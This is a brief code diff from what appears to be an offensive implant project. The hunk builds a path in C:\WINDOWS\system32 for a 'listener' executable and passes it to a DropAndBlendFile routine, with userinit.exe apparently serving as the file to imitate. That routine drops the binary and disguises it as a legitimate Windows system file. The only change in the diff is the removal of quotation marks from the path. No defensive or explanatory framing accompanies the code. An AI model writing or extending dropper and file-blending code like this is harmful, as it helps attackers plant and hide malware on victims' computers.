@@ -33,7 +33,7 @@ int main()
 
     // write the provider DLL to disk
     monstars::HeapBuffer pathBuf(MAX_PATH);
-    wsprintfW(pathBuf.Get<wchar_t>(), L"\"C:\\WINDOWS\\system32\\%s.exe\"", c_ListenerName);
+    wsprintfW(pathBuf.Get<wchar_t>(), L"C:\\WINDOWS\\system32\\%s.exe", c_ListenerName);
     if (!monstars::DropAndBlendFile(
         pathBuf.Get<wchar_t>(), static_cast<char*>(listenerBin), providerSize, L"C:\\Windows\\System32\\userinit.exe"))
     {
